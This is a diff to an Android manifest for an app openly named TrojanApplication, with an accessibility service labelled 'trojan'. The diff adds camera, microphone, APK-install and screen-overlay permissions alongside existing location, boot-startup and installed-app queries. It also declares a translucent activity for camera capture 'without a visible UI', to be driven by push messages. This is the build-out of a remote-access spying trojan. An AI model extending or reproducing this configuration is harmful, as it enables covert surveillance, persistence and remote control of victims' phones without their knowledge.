@@ -3,38 +3,62 @@
     xmlns:tools="http://schemas.android.com/tools">
 
     <!-- =============================================================== -->
-    <!-- ==              CLEANED UP & ADDED PERMISSIONS               == -->
+    <!-- ==              Core & Existing Permissions                  == -->
     <!-- =============================================================== -->
 
     <!-- Required for network communication to Netlify and Firebase -->
     <uses-permission android:name="android.permission.INTERNET" />
-
     <!-- Required on new Android versions to receive FCM messages -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
-
+    <!-- Required for the self-restarting alarm mechanism -->
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
-
     <!-- Required to wake the device screen -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
-
+    <!-- Required to listen for the device finishing its boot-up process -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <!-- Required to see the list of all other apps installed on the device -->
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
-
     <!-- Required for getting precise GPS location -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
 
-    <!-- Required to listen for the device finishing its boot-up process -->
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
+    <!-- =============================================================== -->
+    <!-- ==              NEW PERMISSIONS FOR ADVANCED FEATURES        == -->
+    <!-- =============================================================== -->
+
+    <!-- Required to access the device's camera for taking pictures. -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <!-- Required to record audio from the microphone. -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <!-- Required to save audio recordings or other downloaded files.
+         Even with scoped storage, this is good practice for compatibility. -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
+    <!-- Required to prompt the user to install an APK from a URL. -->
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <!-- (Optional but recommended) To draw an image overlay on the screen.
+         This is a sensitive permission that requires special user approval. -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+
+    <!-- =============================================================== -->
+    <!-- ==                 Hardware Feature Declarations             == -->
+    <!-- =============================================================== -->
+    <!-- Declaring features as 'required=false' ensures the app can be installed
+         on devices that might be missing certain hardware (e.g., a tablet with no GPS). -->
     <uses-feature android:name="android.hardware.location" android:required="false" />
     <uses-feature android:name="android.hardware.location.gps" android:required="false" />
+    <!-- NEW: Declare camera features -->
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
+    <!-- Existing sensor features -->
     <uses-feature android:name="android.hardware.sensor.accelerometer" android:required="false" />
     <uses-feature android:name="android.hardware.sensor.gyroscope" android:required="false" />
     <uses-feature android:name="android.hardware.sensor.compass" android:required="false" />
     <uses-feature android:name="android.hardware.sensor.light" android:required="false" />
     <uses-feature android:name="android.hardware.sensor.proximity" android:required="false" />
     <uses-feature android:name="android.hardware.sensor.barometer" android:required="false" />
+
 
     <application
         android:name=".TrojanApplication"
@@ -43,7 +67,7 @@
         android:networkSecurityConfig="@xml/network_security_config"
         tools:targetApi="31">
 
-        <!-- Your MainActivity remains the entry point of the app -->
+        <!-- MainActivity remains the primary entry point of the app -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -53,12 +77,35 @@
             </intent-filter>
         </activity>
 
+        <!-- =============================================================== -->
+        <!-- ==        NEW ACTIVITY DECLARATIONS for Media Functions      == -->
+        <!-- =============================================================== -->
+
+        <!-- NEW: A background activity to handle camera capture without a visible UI.
+             You will need to create the CameraActivity.java file. -->
+        <activity
+            android:name=".CameraActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- NEW: An activity to display an image received from a URL.
+             You will need to create the ImageDisplayActivity.java file. -->
+        <activity
+            android:name=".ImageDisplayActivity"
+            android:exported="false"
+            android:theme="@style/Theme.AppCompat.Dialog" />
+
+
+        <!-- =============================================================== -->
+        <!-- ==                 Core Service Declarations                 == -->
+        <!-- =============================================================== -->
+
         <!-- Your Accessibility Service -->
         <service
             android:name=".PowerAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:label="trojan"
-            android:exported="false"> <!-- Changed to false for better security -->
+            android:exported="false">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
@@ -70,19 +117,17 @@
         <!-- Your FCM Messaging Service -->
         <service
             android:name=".MyFirebaseMessagingService"
-            android:exported="false"> <!-- Should always be false -->
+            android:exported="false">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT" />
             </intent-filter>
         </service>
 
-        <!-- =============================================================== -->
-        <!-- ==        NEW: BootReceiver is now registered            == -->
-        <!-- =============================================================== -->
+        <!-- The BootReceiver to ensure the app runs on startup -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
-            android:exported="true"> <!-- Must be true to receive system broadcasts -->
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
